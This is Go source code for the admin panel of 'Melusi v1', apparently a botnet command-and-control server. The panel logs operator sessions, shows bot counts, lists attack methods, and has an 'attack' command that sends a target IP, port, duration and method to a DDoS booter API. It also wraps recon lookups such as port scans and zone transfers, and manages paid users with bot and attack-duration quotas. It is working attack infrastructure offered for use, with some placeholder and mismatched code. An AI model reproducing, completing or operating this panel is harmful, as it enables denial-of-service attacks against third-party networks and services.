/*                      Melusi v1. By @melsui 63#9325
[+]=======================================================================[+]
    - CopyRight © 2020 Melusi All Rights Reserved
    Leak/Rip is Prohibited!         
[+]=======================================================================[+]*/
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func handlePanel(this *Admin, username string, password string, userInfo AccountInfo) {
	this.conn.Write([]byte("\r\n\033[1;32m"))
	this.conn.Write([]byte("\033[1;96m[\033[96m\033[1;96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mSuccesfully Authenticated Connection\r\n"))
	time.Sleep(250 * time.Millisecond)
	this.conn.Write([]byte("\033[1;96m[\033[96m\033[1;96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mLogins Unhashed...\r\n"))
	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[1;96m[\033[96m\033[1;96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mSecure Mode: Online...\r\n"))
	time.Sleep(150 * time.Millisecond)
	this.conn.Write([]byte("\033[1;96m[\033[96m\033[1;96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mLogs Encrypted...\r\n"))
	for i := 0; i < 4; i++ {
		time.Sleep(100 * time.Millisecond)
		this.conn.Write([]byte(fmt.Sprintf("\033[1;96m[\033[96m\033[96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mEncrypted Status:%d\r\n", i+1)))
	}
	this.conn.Write([]byte("\033[1;96m[\033[0m\033[1;96m+\033[1;96m] \033[32mSession \033[1;32m| \033[32mSetting up Melusi Terminal...\r\n"))
	time.Sleep(1 * time.Second)

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Online Users | [7] Servers | v1 | User: %s\007", len(Sessions), BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;0m\x1b[1;96mType start To Start\x1b[1;92m Melusi\r\n"))

	var cmd string
	var err error

	for {
		this.conn.Write([]byte("\033[01;96m" + username + "\033[01;32m@\033[01;32mMelusi \033"))
		cmd, err = this.ReadLine(false)
		if err != nil || cmd == "no" || cmd == "No" || cmd == "NO" || cmd == "No." {
			return
		}

		if strings.ToLower(cmd) != "start" {
			this.conn.Write([]byte("Type start\r\n"))
			continue
		}

		break
	}
	this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╔╦╗╔═╗╦ \x1b[1;32m ╦ ╦╔═╗╦                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ║║║║╣ ║ \x1b[1;32m ║ ║╚═╗║                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╩ ╩╚═╝╩═\x1b[1;32m╝╚═╝╚═╝╩                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                👾 We Are \x1b[1;32mLeaders 👾             \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╔════════════════════════\x1b[1;32m═══════════════════════╗\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║- - - - - - - Welcome To\x1b[1;32m Melusi v1 - - - - - - ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║  - - - - - - Connection\x1b[1;32m Logged! - - - - - -   ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╚════════════════════════\x1b[1;32m═══════════════════════╝\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╔═════════════════════\x1b[1;32m════════════════════╗   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ║- - - - Type help To \x1b[1;32mSee Commands - - - -║   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╚═════════════════════\x1b[1;32m════════════════════╝   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m\r\n"))
	for {

		sessionKeepAlive(username)

		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[01;96m" + username + "\033[01;32m@\033[01;32mMelusi \033"))
		cmd, err = this.ReadLine(false)
		if err != nil {
			return
		}

		if len(cmd) < 1 {
			continue
		}

		if cmd[0] == '-' {
			continue
		}

		fmt.Println("cmd:", len(cmd))
		WriteLog("cnc-log.txt", []byte(time.Now().Format("2006-01-02 15:04:05")+"  "+username+": "+cmd))

		/*if strings.Contains(cmd, "@") {
			continue
		}*/

		if err != nil || cmd == "back" || cmd == "c" || cmd == "clear" || cmd == "cls" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╔╦╗╔═╗╦  \x1b[1;32m╦ ╦╔═╗╦                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ║║║║╣ ║  \x1b[1;32m║ ║╚═╗║                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╩ ╩╚═╝╩═╝\x1b[1;32m╚═╝╚═╝╩                \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                👾 We Are \x1b[1;32mLeaders 👾             \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╔═════════════════════════\x1b[1;32m══════════════════════╗\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║- - - - - - - Welcome To \x1b[1;32mMelusi v1 - - - - - - ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║  - - - - - - Connection \x1b[1;32mLogged! - - - - - -   ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╚═════════════════════════\x1b[1;32m══════════════════════╝\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╔══════════════════════\x1b[1;32m═══════════════════╗   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ║- - - - Type help To S\x1b[1;32mee Commands - - - -║   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                    ╚══════════════════════\x1b[1;32m═══════════════════╝   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m\r\n"))
			continue
		}

		if err != nil || cmd == "ADMIN" || cmd == "admin" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m╔══════════════════\x1b[1;32m══════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m║ adduser  < Add An\x1b[1;32mUser      ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m║ addadmin < Add An\x1b[1;32mAdmin     ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m║ deluser  < Remove\x1b[1;32mAn User   ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m╚══════════════════\x1b[1;32m══════════╝\x1b[0m\r\n"))
			continue
		}

		if err != nil || cmd == "CREDITS" || cmd == "credits" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m╔════════════════\x1b[1;32m══════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m║[+]------- [Cred\x1b[1;32mits] ------[+]║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m║ [Creator Of Sou\x1b[1;32mrce: @iotnet] ║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m\x1b[1;96m╚════════════════\x1b[1;32m══════════════╝\x1b[0m\r\n"))
			continue
		}
		if cmd == "server" || cmd == "STATS" || cmd == "stats" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m╔══════════════════════════╦\x1b[1;32m═════════════════════════╗\x1b[0m\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m║#1 Total Attacks: %d      ║ \x1b[1;32mUsername: %s              ║\r\n", database.fetchAttacks(), username)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m║#2 Total Users: %d        ║ \x1b[1;32mStatus  : Active         ║\r\n", database.fetchUsers())))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m║#3 Version: Melusi v1     ║\x1b[1;32m Melusi                  ║\x1b[0m\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m╠══════════════════════════╬\x1b[1;32m═════════════════════════╣\x1b[0m\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m║ Source Made By  @iotnet  ║\x1b[1;32m-----Best Method: STD----║\x1b[0m\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;96m╚══════════════════════════╩\x1b[1;32m═════════════════════════╝\x1b[0m\r\n")))
			continue
		}
		if err != nil || cmd == "methods" || cmd == "METHODS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╔╦╗╔═╗╦  \x1b[1;32m╦ ╦╔═╗╦      \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ║║║║╣ ║  \x1b[1;32m║ ║╚═╗║      \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                  ╩ ╩╚═╝╩═╝\x1b[1;32m╚═╝╚═╝╩      \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                                👾 We Are \x1b[1;32mLeaders 👾   \r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╔═══════════════════════════════════════════════╗\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║- - - - - - - -  Botnet Methods - - - - - - - -║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║NBA-CRASH                                      ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ║                                               ║\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m                 ╚═══════════════════════════════════════════════╝\r\n"))
	        this.conn.Write([]byte("\x1b[0m\x1b[1;96m\r\n"))
			continue
		}
		/////////////// API FUNCTION
		if err != nil || cmd == "attack" || cmd == "ATTACK" {
			this.conn.Write([]byte("\033[01;96mIP\033[01;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[01;32mPort\033[01;96m: \x1b[0m"))
			port, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[01;96mTime\033[01;32m: \x1b[0m"))
			timee, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[01;32mMethod\033[01;96m: \x1b[0m"))
			method, err := this.ReadLine(false)
			if err != nil {
				return
			} //https://securityteamapi.io/api.php?ip=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + "&vip=NO&user=Compiled&key=NULL
			url := "API" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96m\033[01;96mAttack Has Been Sent By " + username + "\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mError... IP/Hostname Only!\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;96mAPI Server Result\033[01;32m: \r\n\033[01;96m" + locformatted + "\x1b[0m\r\n"))
		}
		///////////////////////// END OF API BOOTER
		if err != nil || cmd == ".ip" {
			this.conn.Write([]byte("\x1b[1;96mIP\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mmAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;96mResults\x1b[1;96m: \r\n\x1b[1;96m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "PORTSCAN" || cmd == "portscan" {
			this.conn.Write([]byte("\x1b[1;96mIP\x1b[1;96m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mError... IP Address/Host Name Only!\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;96m: \r\n\x1b[1;96m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "WHOIS" || cmd == "whois" {
			this.conn.Write([]byte("\x1b[1;96mIP\x1b[1;96m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "PING" || cmd == "ping" {
			this.conn.Write([]byte("\x1b[1;96mIP\x1b[1;96m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "traceroute" || cmd == "TRACEROUTE" {
			this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "resolve" || cmd == "RESOLVE" {
			this.conn.Write([]byte("\x1b[1;33mURL (Without www.)\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "reversedns" || cmd == "REVERSEDNS" {
			this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
			this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "subnetcalc" || cmd == "SUBNETCALC" {
			this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "zonetransfer" || cmd == "ZONETRANSFER" {
			this.conn.Write([]byte("\x1b[1;33mIPv4 Or Website (Without www.)\x1b[1;36m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("\x1b[1;96mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;96mBotcount (-1 for Full Botcount):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mAttack Duration (86400 MAX):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;96mConcurrent (1 for 1 attack at a time):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse Concurrent")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;96m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;96m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;96m" + duration_str + "\r\n\033[0m- Concurrent - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;96mUser Added Successfully!\033[0m\r\n"))
			}

			logMsg := fmt.Sprintf("Admin: %s created a new user: %s with attack duration: %s", userInfo.username, new_un, duration_str)
			WriteLog("admin.log", []byte(logMsg))
			log.Println(logMsg)

			continue
		}

		if userInfo.admin == 1 && cmd == "deluser" {
			this.conn.Write([]byte("\x1b[1;96mUsername: \x1b[0m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \x1b[1;32mAre You Sure You Want To Remove \x1b[1;96m" + rm_un + "\x1b[1;32m?(y/n): \x1b[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;96mUnable to Remove User\r\n")))
			} else {
				this.conn.Write([]byte("\x1b[1;32mUser Successfully Removed!\r\n"))
			}

			logMsg := fmt.Sprintf("Admin: %s has removed the user: %s", userInfo.username, rm_un)
			WriteLog("admin.log", []byte(logMsg))
			log.Println(logMsg)

			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\x1b[1;96mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;96mBotcount (-1 for All):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mAttack Duration (86400 MAX):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;96mConcurrent (1 for 1 attack at a time):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse Concurrent")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;96m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;96m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;96m" + duration_str + "\r\n\033[0m- Concurrent - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;96mContinue? (y/n):\x1b[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;96mAdmin Added Successfully!\033[0m\r\n"))
			}

			logMsg := fmt.Sprintf("Admin: %s created a new admin user: %s with attack duration: %s", userInfo.username, new_un, duration_str)
			WriteLog("admin.log", []byte(logMsg))
			log.Println(logMsg)

			continue
		}

		if cmd == "BOTS" || cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;96m%s \x1b[0m[\x1b[1;32m%d\x1b[0m]\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;96mTotal \x1b[0m[\x1b[1;32m%d\x1b[0m]\r\n\033[0m", botCount)))
			continue
		}
